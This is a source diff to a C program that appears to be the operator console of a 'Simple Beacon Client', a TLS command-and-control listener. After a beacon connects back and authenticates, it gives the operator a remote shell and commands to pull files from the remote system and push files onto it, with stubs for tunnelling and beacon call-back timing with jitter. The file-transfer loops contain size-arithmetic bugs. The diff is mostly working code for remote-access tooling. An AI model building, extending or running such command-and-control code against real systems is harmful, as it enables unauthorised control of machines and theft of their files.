@@ -22,11 +22,15 @@ int setuplistner(int, int *);
 SSL_CTX* initCTX(void);
 void loadcert(SSL_CTX *, char *, char *);
 int cmdshell(SSL *);
+int getfile(SSL *);
+int putfile(SSL *);
 void displayhelp(void);
+int cmdloop(SSL *);
 int entersession(SSL *, char *);
 ssize_t ssl_readall(SSL *, uint8_t *, size_t, size_t *);
 ssize_t ssl_writeall(SSL *, uint8_t *, size_t, size_t *);
 ssize_t writeall(int, uint8_t *, size_t, size_t *);
+ssize_t readall(int, uint8_t *, size_t, size_t *);
 
 // Setup the main listening port
 int setuplistner(int port, int *sockfd) {
@@ -132,15 +136,15 @@ void loadcert(SSL_CTX* ctx, char *cert, char *key) {
 
 /*
 // Spawn a new connection immediately
-int newconn(SSL *ssl, char addr, char port) {
-
+int newconn(SSL *ssl) {
+  
 }
 */
 // Enter into a remote shell
 int cmdshell(SSL *ssl) {
   uint8_t msg[4096] = {0};
   uint8_t buf[4096] = {0};
-  int exit = 0, res;
+  int res;
   size_t total_sent = 0, total_recv = 0;
 
   // Send the command to the remote server
@@ -167,8 +171,7 @@ int cmdshell(SSL *ssl) {
 
     if (ssl_writeall(ssl, msg, sizeof(msg), &total_sent) < 0) {
       fprintf(stderr, "[-] Failed write to the server - exiting the shell interface now.\n");
-      exit = -1;
-      break;
+      return 2;
     }
     memset(msg, 0, sizeof(msg));
 
@@ -184,164 +187,196 @@ int cmdshell(SSL *ssl) {
     }
   }
 
-  return exit;
+  return 2;
 }
-/*
+
 // Retrieve a file from the remote system; place in /tmp with the specified localname
-int getfile(SSL *ssl, char remotepath, char localpath) {
-  int fd, exit = 0;
-  char ans[256] = {0};
-  char buf[4096] = {0};
+int getfile(SSL *ssl) {
+  uint8_t localpath[4096];
+  uint8_t remotepath[4096];
+  int fd;
+  uint8_t ans[256] = {0};
+  uint8_t buf[4096] = {0};
   ssize_t filesize = 0;
   size_t total_recv = 0, total_sent = 0, written = 0;
 
+  printf("Enter the remote file path: ");
+  fgets((char *)remotepath, 4096, stdin);
+  remotepath[strcspn((char *)remotepath, "\r\n")] = 0;
+
+  printf("Enter the local file path: ");
+  fgets((char *)localpath, 4096, stdin);
+  localpath[strcspn((char *)localpath, "\r\n")] = 0;
+
+  // Create or open the local file 
+  if ((fd = open((char *)localpath, O_WRONLY | O_APPEND | O_CREAT, 0644)) == -1) {
+    perror("[-] ERROR: Could not open designated local file");
+    return 3;    
+  }
+
   // Send the server a message letting it know we would like to recieve a file
-  ssl_writeall(ssl, "3", 2, &total_sent);
+  ssl_writeall(ssl, (uint8_t *)"3", 2, &total_sent);
 
   // Make sure the server is good to go with allowing us to recieve a file
-  ssl_readall(ssl, ans, sizeof(ans), &total_recv);
-  strcmp(ans, "300");
+  ssl_readall(ssl, ans, 4, &total_recv);
+  if (strcmp((char *)ans, "300") != 0) {
+    fprintf(stderr, "[-] Unexpected answer from server while setting up: %s.\n", ans);
+    return 3;
+  }
 
   // Send the file name that we would like to get 
-  ssl_writeall(ssl, &remotepath, sizeof(remotepath), &total_sent);
+  ssl_writeall(ssl, remotepath, sizeof(remotepath), &total_sent);
 
   // If the server can open the file it will send us the size of the file to be recieved
   memset(ans, 0, sizeof(ans));
   ssl_readall(ssl, ans, sizeof(ans), &total_recv);
-  if (atoi(ans) < 1) {
+  filesize = atoi((char *)ans);
+  if (filesize < 1) {
     fprintf(stderr, "[-] There was an error getting the size of the remote file.\n");
-    exit = -1;
-    goto leave;
+    return 3;
   }
-
-  // Create or open the local file 
-  fd = open(localpath, O_RDWR, O_CREAT);
-
-  // Message the server that we are ready to download
-  ssl_writeall(ssl, "301", 3, &total_sent);
 
   // Download the file
   printf("[*] Getting remote file %s and placing at %s.\n", remotepath, localpath);
-  total_recv = 0;
-  while(total_recv < filesize) {
+  while(written < (size_t)filesize) {
     ssl_readall(ssl, buf, sizeof(buf), &total_recv);
-    writeall(fd, buf, sizeof(buf), written);
+    writeall(fd, buf, (size_t)filesize - written % sizeof(buf), &written);
     memset(buf, 0, sizeof(buf));
-    written = 0;
   }
   close(fd);
 
-  printf("[+] Wrote %ld bytes to %s.\n", total_recv, localpath);
+  printf("[+] Wrote %ld bytes to %s.\n", written, localpath);
 
-  leave:
-  return exit;
+  return 3;
 }
 
 // Put a file on the remote system; place at the specified remote path
-int putfile(SSL *ssl, char localpath, char remotepath) {
-  int localfd;
-  ssize_t total_sent = 0;
+int putfile(SSL *ssl) {
+  uint8_t localpath[4096];
+  uint8_t remotepath[4096];
+  int fd;
+  uint8_t ans[256] = {0};
+  uint8_t buf[4096] = {0};
+  ssize_t filesize = 0;
+  struct stat st;
+  size_t total_recv = 0, total_sent = 0, total_read = 0;
 
-  // Check if the local file exists and can be opened
-  if ((localfd = open(localfile, O_RDONLY)) != 0) {
-    perrror("[-] Failed to open the local file for reading.");
-    return -1;
+  printf("Enter the local file path: ");
+  fgets((char *)localpath, 4096, stdin);
+  localpath[strcspn((char *)localpath, "\r\n")] = 0;
+
+  printf("Enter the remote file path: ");
+  fgets((char *)remotepath, 4096, stdin);
+  remotepath[strcspn((char *)remotepath, "\r\n")] = 0;
+
+  // Create or open the local file 
+  if ((fd = open((char *)localpath, O_RDONLY)) == -1) {
+    perror("[-] ERROR: Could not open designated local file");
+    return 4;    
   }
-  
-  // Tell the server what we would like to do and wait for confirmation that we are good to proceed. 
-  printf("[*] Sending request for server to enter put mode.\n");
-  SSL_write()
 
+  // Send the server a message letting it know we would like to put a file up
+  ssl_writeall(ssl, (uint8_t *)"4", 2, &total_sent);
 
-  printf("[*] Server is in put mode and awaiting file transfer.\n");
+  // Make sure the server is good to go with allowing us to recieve a file
+  ssl_readall(ssl, ans, 4, &total_recv);
+  if (strcmp((char *)ans, "400") != 0) {
+    fprintf(stderr, "[-] Unexpected answer from server while setting up: %s\n", ans);
+    return 4;
+  }
 
-  // Tell the user what file they are getting and where it is being placed.
-  printf("[*] Putting local file %s on remote at %s\n", localfile, remotepath);
+  // Send the file name that we would like to put our new file up as
+  ssl_writeall(ssl, remotepath, sizeof(remotepath), &total_sent);
 
-  // Check with remote to ensure the remote path exists and the file can be written
+  // Check to ensure the server was able to open the remote file.
+  memset(ans, 0, sizeof(ans));
+  ssl_readall(ssl, ans, 4, &total_recv);
+  if (strcmp((char *)ans, "401") != 0) {
+    fprintf(stderr, "[-] The server was unable to open the remote file path for writing.\n");
+    return 4;
+  }
 
-  // Tell remote to get ready to transfer the stream of bytes into the file
-  printf("[*] Putting local file %s on remote at %s\n", localfile, remotepath);
-  
+  // Get the file size and then rewind to the begining of the file
+  fstat(fd, &st);
+  filesize = st.st_size;
+  sprintf((char *)ans, "%ld", filesize);
+  ssl_writeall(ssl, ans, sizeof(ans), &total_recv);
 
+  // Send the file
+  printf("[*] Putting local file %s on remote and placing at %s.\n", localpath, remotepath);
+  total_sent = 0;
+  while(total_sent < (size_t)filesize) {
+    memset(buf, 0, sizeof(buf));
+    readall(fd, buf, (size_t)filesize - total_read % sizeof(buf), &total_read);
+    ssl_writeall(ssl, buf, sizeof(buf), &total_sent);
+  }
+  printf("[+] Sent %ld bytes to remote server to be placed in %s.\n", total_read, remotepath);
+
+  close(fd);
+  return 4;
 }
 
-// Establish a portforwarded tunnel
-int tunnel(SSL *ssl, char lport, char addr, char rport) {
+// Establish a tunnel
+//int tunnel(SSL *ssl) {
+//
+//}
 
-}
-
-// Set the time window to call back in; extended option is to set the jitter as well
-int window(SSL *ssl, char win, char jitter) {
-
-}
-
-// Exit the session and tear down.
-int goodbye(SSL *ssl) {
-
-}
-
-*/
 // Display total help menu
 void displayhelp() {
-  fprintf(stderr, "=====================================\n"
-    "Help Mneu\n"
-    "\n"
-    "sbc> new <address> <port>\n"
-    "sbc> cmd\n"
-    "sbc> get <remotepath> <localname>\n"
-    "sbc> put <localpath> <remotepath>\n"
-    "sbc> tun <lport> <address> <rport>\n"
-    "sbc> win <time-window> <jitter>\n"
-    "sbc> bye\n"
-    "\n"
+  fprintf(stderr, 
+    "=====================================\n"
+    "   Simple Beacon Client Help Menu\n"
+    "=====================================\n"
+    "sbc> new -- Spawn a new beacon.\n"
+    "sbc> cmd -- Enter a shell.\n"
+    "sbc> get -- Get a file.\n"
+    "sbc> put -- Put up a file.\n"
+    "sbc> tun -- Start a tunnel.\n"
+    "sbc> bye -- Exit the client.\n"
     "=====================================\n"
   );
 }
-/*
-int parsecmd(char *msg, char **cmdv[]) {
-  int res, i, quotes = 0;
-  char *spaceptr, *quoteptr;
-  char buf[4096];
-  
-  for (size_t i = 0; i < 5; i++) {
-    char *cmdv[i] = strtok_r(msg, " ", &spaceptr);
-    if ((quoteptr = strpbrk(cmdv[i], "\"")) != NULL) {
-        strlcpy(buf); 
-    }
-  }
 
-  if ((res = strcmp(*cmdv[0], "new")) == 0) {
+// cmdloop interface
+int cmdloop(SSL* ssl) {
+  size_t ts;
+  uint8_t msg[4096] = {0};
+  
+  printf("sbc> ");
+  fgets((char *)msg, 4096, stdin);
+  msg[strcspn((char *)msg, "\r\n")] = 0;
+  
+  if ((strcmp((char *)msg, "new")) == 0) {
     return 1;
   }
-  if ((res = strcmp(*cmdv[0], "cmd")) == 0) {
-    return 2; 
+  if ((strcmp((char *)msg, "cmd")) == 0) {
+    return cmdshell(ssl);
   }
-  if ((res = strcmp(*cmdv[0], "get")) == 0) {
-    return 3;
+  if ((strcmp((char *)msg, "get")) == 0) {
+    return getfile(ssl);
   }
-  if ((res = strcmp(*cmdv[0], "put")) == 0) {
-    return 4; 
+  if ((strcmp((char *)msg, "put")) == 0) {
+    return putfile(ssl);
   }
-  if ((res = strcmp(*cmdv[0], "tun")) == 0) {
-    return 5;
+  if ((strcmp((char *)msg, "tun")) == 0) {
+    //return tunnel(ssl);
   }
-  if ((res = strcmp(*cmdv[0], "win")) == 0) {
-    return 6; 
+  if ((strcmp((char *)msg, "bye")) == 0) {
+    //https://stackoverflow.com/questions/18433585/kill-all-child-processes-of-a-parent-but-leave-the-parent-alive
+    ssl_writeall(ssl, (uint8_t *)"6", 2, &ts);
+    return 0;
   }
-  if ((res = strcmp(*cmdv[0], "bye")) == 0) {
-    return 7;
-  }
-
-  return -1;
+  displayhelp();
+  return 10;
 }
-*/
+
 int entersession(SSL *ssl, char *auth) { // threadable
   uint8_t buf[4096] = {0};
   uint8_t msg[4096] = {0};
   //char *cmdv[5] = {NULL};
   size_t total_recv = 0, total_sent = 0;
-  int bytes, sd, exit = 0, cmd = -1;
+  int bytes, sd, exit = 0;
+
   // Accept the inbound SSL connection
   if (SSL_accept(ssl) != 1) {                                   
     ERR_print_errors_fp(stderr);
@@ -396,42 +431,14 @@ int entersession(SSL *ssl, char *auth) { // threadable
       goto cleanup;
     }
   }
+  free(auth);
+  printf("[+] Successfully authenticated! Entering session.\n");
 
   // Print Help Menu and then enter into menued context
   displayhelp();
   while(1) {
-    memset(buf, 0, sizeof(buf));
-    memset(msg, 0, sizeof(msg));
-    //fgets(msg, 4096, sizeof(msg));
-
-    //printf("sbc> ");
-    cmd = 2; //parsecmd(*msg, *cmdv);
-
-    switch(cmd) {
-      case NEW:
-        //newconn(ssl, cmdv[1], cmdv[2]);
-        break;
-      case CMD:
-        cmdshell(ssl);
-        break;
-      case GET:
-        //getfile(ssl, cmdv[1], cmdv[2]);
-        break;
-      case PUT:
-        //putfile(ssl, cmdv[1], cmdv[2]);
-        break;
-      case TUN:
-        //tunnel(ssl, cmdv[1], cmdv[2], cmdv[3]);
-        break;
-      case WIN:
-        //window(ssl, cmdv[1], cmdv[2]);
-        break;
-      case BYE:
-        //goodbye(ssl);
-        goto cleanup;
-      default:
-        displayhelp();
-        break;
+    if (cmdloop(ssl) <= 0) {
+      break;
     }
   }
 
@@ -480,6 +487,21 @@ ssize_t ssl_writeall(SSL *ssl, uint8_t *msg, size_t len, size_t *total_sent) {
   return s;
 }
 
+ssize_t readall(int fd, uint8_t *buf, size_t len, size_t *total_read) {
+  ssize_t r = 0;
+  size_t readin = 0;
+
+  while(readin < len) {
+    if ((r = read(fd, &buf[readin], len-readin)) <= 0) {
+      break;
+    }
+    (*total_read) +=r;
+    readin += r;
+  }
+
+  return r;
+}
+
 ssize_t writeall(int fd, uint8_t *buf, size_t len, size_t *total_written) {
   ssize_t w = 0;
   size_t written = 0;
@@ -487,6 +509,8 @@ ssize_t writeall(int fd, uint8_t *buf, size_t len, size_t *total_written) {
   while(written < len) {
     if ((w = write(fd, &buf[written], len-written)) < 0) {
       perror("[-] ERROR: Write function encountered an error");
+      break;
+    } else if (w == 0) {
       break;
     }
     (*total_written) += w;
@@ -496,25 +520,6 @@ ssize_t writeall(int fd, uint8_t *buf, size_t len, size_t *total_written) {
   return w;
 }
 
-/*
-ssize_t readall(int fd, uint8_t *buf, size_t len, size_t *total_read) {
-  ssize_t r = 0;
-  size_t red = 0;
-
-  while (red < len) {
-    r = read(fd, &buf[red], len-red);
-    if (r < 0) {
-      perror("[-] ERROR: Read function encountered an error");
-      break;
-    } else if (r == 0) {
-      break;
-    } else {
-      red += r;
-      (*total_read) += r;
-    }
-  }
-}
-*/
 int parseargs(int argc, char **argv, char **auth, int *port) {
   int option_char;
   char *authentication;
@@ -572,6 +577,10 @@ int main(int argc, char **argv) {
     struct sockaddr_storage peer;           // The storage space that will reveal the peer address information.
     socklen_t peerlen;                      // The peerlen message that is required for printing out peer info.
     char ipstr[INET6_ADDRSTRLEN];           // The ip address string for the peer -- is large enough to hold the max IPv6 length address.
+    int keepalive = 1;
+    int keepcnt = 5;
+    int keepidle = 30; 
+    int keepintvl = 120;
 
     // Ensure the user is running as root
     if(getuid() != 0) {
@@ -596,6 +605,12 @@ int main(int argc, char **argv) {
     
     // Catch a connection and start a session
     serverfd = accept(sockfd, (struct sockaddr *)&server, &socklen);                // Accept connection as usual
+
+    // Set keepalives
+    setsockopt(serverfd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(int));
+    setsockopt(serverfd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(int));
+    setsockopt(serverfd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(int));
+    setsockopt(serverfd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(int));
 
     // Print who we are speaking to.
     peerlen = sizeof(peer);
